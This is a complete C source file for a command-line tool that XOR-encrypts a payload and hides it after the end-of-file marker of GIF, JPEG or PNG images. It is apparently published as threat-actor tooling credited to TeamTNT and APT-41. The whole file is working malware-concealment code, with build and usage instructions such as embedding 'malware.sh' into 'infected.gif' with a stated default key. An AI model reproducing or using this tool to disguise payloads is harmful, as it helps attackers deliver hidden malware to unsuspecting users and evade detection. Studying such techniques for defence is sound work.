/*
 * polyglot_embed.c - Polyglot Image Payload Embedder
 * ====================================================
 *
 * Embeds XOR-encrypted payloads into image files after EOF markers.
 * Attributed to APT TeamTNT cryptomining campaigns.
 *
 * Technique discovered in:
 * - APT TeamTNT operations (2020-2024)
 * - APT-41 KEYPLUG malware (2019-2024)
 *
 * For security research and VX Underground publication.
 *
 * Author: SWORDIntel
 * Date: 2025-11-08
 * Attribution: APT TeamTNT
 *
 * BUILD:
 *   gcc -O2 -Wall -o polyglot_embed polyglot_embed.c
 *
 * USAGE:
 *   ./polyglot_embed <image> <payload> <output> [xor_key]
 *
 * EXAMPLE:
 *   ./polyglot_embed meme.gif malware.sh infected.gif 9e0a61200d
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <strings.h>

#define VERSION "1.0.0"
#define MAX_FILE_SIZE (100 * 1024 * 1024)  // 100MB max
#define DEFAULT_XOR_KEY "9e0a61200d"       // APT TeamTNT / KEYPLUG default

// Image format EOF markers
typedef struct {
    const char *ext;
    const uint8_t *marker;
    size_t marker_len;
} ImageFormat;

static const uint8_t GIF_EOF[] = {0x3b};
static const uint8_t JPEG_EOF[] = {0xff, 0xd9};
static const uint8_t PNG_EOF[] = {0x49, 0x45, 0x4e, 0x44, 0xae, 0x42, 0x60, 0x82};

static const ImageFormat FORMATS[] = {
    {"gif",  GIF_EOF,  sizeof(GIF_EOF)},
    {"jpg",  JPEG_EOF, sizeof(JPEG_EOF)},
    {"jpeg", JPEG_EOF, sizeof(JPEG_EOF)},
    {"png",  PNG_EOF,  sizeof(PNG_EOF)},
    {NULL, NULL, 0}
};

/*
 * Find image format by extension
 */
const ImageFormat* detect_format(const char *filename) {
    const char *ext = strrchr(filename, '.');
    if (!ext) return NULL;
    ext++; // Skip the dot

    for (int i = 0; FORMATS[i].ext != NULL; i++) {
        if (strcasecmp(ext, FORMATS[i].ext) == 0) {
            return &FORMATS[i];
        }
    }
    return NULL;
}

/*
 * Find last occurrence of EOF marker in image data
 */
ssize_t find_eof_marker(const uint8_t *data, size_t data_len, const ImageFormat *fmt) {
    if (!data || !fmt || data_len < fmt->marker_len) {
        return -1;
    }

    // Search backwards for EOF marker
    for (ssize_t i = data_len - fmt->marker_len; i >= 0; i--) {
        if (memcmp(data + i, fmt->marker, fmt->marker_len) == 0) {
            return i + fmt->marker_len;  // Return position AFTER marker
        }
    }

    return -1;
}

/*
 * Convert hex string to bytes
 */
int hex_to_bytes(const char *hex, uint8_t *bytes, size_t max_len) {
    size_t hex_len = strlen(hex);
    if (hex_len % 2 != 0 || hex_len / 2 > max_len) {
        return -1;
    }

    size_t byte_len = hex_len / 2;
    for (size_t i = 0; i < byte_len; i++) {
        if (sscanf(hex + 2*i, "%2hhx", &bytes[i]) != 1) {
            return -1;
        }
    }

    return byte_len;
}

/*
 * XOR encrypt/decrypt data
 * (Same operation for both encryption and decryption)
 */
void xor_crypt(uint8_t *data, size_t data_len, const uint8_t *key, size_t key_len) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
}

/*
 * Read entire file into memory
 */
uint8_t* read_file(const char *filename, size_t *out_len) {
    FILE *fp = fopen(filename, "rb");
    if (!fp) {
        perror("fopen");
        return NULL;
    }

    // Get file size
    struct stat st;
    if (fstat(fileno(fp), &st) != 0) {
        perror("fstat");
        fclose(fp);
        return NULL;
    }

    size_t file_size = st.st_size;
    if (file_size == 0 || file_size > MAX_FILE_SIZE) {
        fprintf(stderr, "Invalid file size: %zu bytes\n", file_size);
        fclose(fp);
        return NULL;
    }

    // Allocate and read
    uint8_t *data = malloc(file_size);
    if (!data) {
        perror("malloc");
        fclose(fp);
        return NULL;
    }

    size_t read_len = fread(data, 1, file_size, fp);
    fclose(fp);

    if (read_len != file_size) {
        fprintf(stderr, "Read error: expected %zu, got %zu\n", file_size, read_len);
        free(data);
        return NULL;
    }

    *out_len = file_size;
    return data;
}

/*
 * Write data to file
 */
int write_file(const char *filename, const uint8_t *data, size_t data_len) {
    FILE *fp = fopen(filename, "wb");
    if (!fp) {
        perror("fopen");
        return -1;
    }

    size_t written = fwrite(data, 1, data_len, fp);
    fclose(fp);

    if (written != data_len) {
        fprintf(stderr, "Write error: expected %zu, wrote %zu\n", data_len, written);
        return -1;
    }

    return 0;
}

/*
 * Main embedding function
 */
int embed_payload(const char *image_path, const char *payload_path,
                  const char *output_path, const char *xor_key_hex) {

    printf("[*] APT TeamTNT Polyglot Embedder v%s\n", VERSION);
    printf("[*] Image: %s\n", image_path);
    printf("[*] Payload: %s\n", payload_path);
    printf("[*] Output: %s\n", output_path);

    // Detect image format
    const ImageFormat *fmt = detect_format(image_path);
    if (!fmt) {
        fprintf(stderr, "[!] Unsupported image format\n");
        return 1;
    }
    printf("[*] Format: %s (EOF marker: %zu bytes)\n", fmt->ext, fmt->marker_len);

    // Read image
    size_t image_len;
    uint8_t *image_data = read_file(image_path, &image_len);
    if (!image_data) {
        return 1;
    }
    printf("[*] Image size: %zu bytes\n", image_len);

    // Find EOF marker
    ssize_t eof_pos = find_eof_marker(image_data, image_len, fmt);
    if (eof_pos < 0) {
        fprintf(stderr, "[!] EOF marker not found in image\n");
        free(image_data);
        return 1;
    }
    printf("[*] EOF marker at offset: 0x%lx (%ld bytes)\n", (long)eof_pos, (long)eof_pos);

    // Read payload
    size_t payload_len;
    uint8_t *payload_data = read_file(payload_path, &payload_len);
    if (!payload_data) {
        free(image_data);
        return 1;
    }
    printf("[*] Payload size: %zu bytes\n", payload_len);

    // Parse XOR key
    uint8_t xor_key[256];
    int key_len = hex_to_bytes(xor_key_hex, xor_key, sizeof(xor_key));
    if (key_len < 0) {
        fprintf(stderr, "[!] Invalid XOR key hex string\n");
        free(image_data);
        free(payload_data);
        return 1;
    }
    printf("[*] XOR key: %s (%d bytes)\n", xor_key_hex, key_len);

    // Encrypt payload
    printf("[*] Encrypting payload...\n");
    xor_crypt(payload_data, payload_len, xor_key, key_len);

    // Create polyglot: image (up to EOF) + encrypted payload
    size_t polyglot_len = eof_pos + payload_len;
    uint8_t *polyglot_data = malloc(polyglot_len);
    if (!polyglot_data) {
        perror("malloc");
        free(image_data);
        free(payload_data);
        return 1;
    }

    memcpy(polyglot_data, image_data, eof_pos);
    memcpy(polyglot_data + eof_pos, payload_data, payload_len);

    // Write output
    printf("[*] Writing polyglot file...\n");
    if (write_file(output_path, polyglot_data, polyglot_len) != 0) {
        free(image_data);
        free(payload_data);
        free(polyglot_data);
        return 1;
    }

    // Cleanup
    free(image_data);
    free(payload_data);
    free(polyglot_data);

    // Success summary
    printf("\n[+] Polyglot created successfully!\n");
    printf("    Original image: %zu bytes\n", image_len);
    printf("    Payload (encrypted): %zu bytes\n", payload_len);
    printf("    Final polyglot: %zu bytes\n", polyglot_len);
    printf("    Overhead: +%zu bytes (+%.1f%%)\n",
           polyglot_len - image_len,
           (float)(polyglot_len - image_len) / image_len * 100);
    printf("\n[+] Image should still display normally!\n");
    printf("[+] Payload hidden after byte %ld\n", (long)eof_pos);

    return 0;
}

/*
 * Usage information
 */
void usage(const char *progname) {
    printf("APT TeamTNT Polyglot Image Embedder v%s\n", VERSION);
    printf("\nUSAGE:\n");
    printf("  %s <image> <payload> <output> [xor_key]\n\n", progname);
    printf("ARGUMENTS:\n");
    printf("  image      Source image file (GIF/JPG/PNG)\n");
    printf("  payload    Payload file to embed (script/binary)\n");
    printf("  output     Output polyglot file\n");
    printf("  xor_key    XOR key in hex (default: %s)\n\n", DEFAULT_XOR_KEY);
    printf("EXAMPLES:\n");
    printf("  # Embed with default TeamTNT key\n");
    printf("  %s meme.gif malware.sh infected.gif\n\n", progname);
    printf("  # Embed with custom multi-byte key\n");
    printf("  %s photo.jpg payload.bin stego.jpg 9e0a61200d\n\n", progname);
    printf("  # Single-byte XOR\n");
    printf("  %s image.png script.sh output.png d3\n\n", progname);
    printf("SUPPORTED FORMATS:\n");
    printf("  GIF  (.gif)  - Trailer: 0x3B\n");
    printf("  JPEG (.jpg)  - EOI: 0xFF 0xD9\n");
    printf("  PNG  (.png)  - IEND: 49 45 4E 44 AE 42 60 82\n\n");
    printf("ATTRIBUTION:\n");
    printf("  Technique: APT TeamTNT cryptomining campaigns\n");
    printf("  Also seen: APT-41 KEYPLUG malware\n");
    printf("  Analysis: SWORDIntel (2025)\n\n");
    printf("For VX Underground publication and security research only.\n");
}

/*
 * Main entry point
 */
int main(int argc, char **argv) {
    if (argc < 4 || argc > 5) {
        usage(argv[0]);
        return 1;
    }

    const char *image_path = argv[1];
    const char *payload_path = argv[2];
    const char *output_path = argv[3];
    const char *xor_key = (argc == 5) ? argv[4] : DEFAULT_XOR_KEY;

    return embed_payload(image_path, payload_path, output_path, xor_key);
}
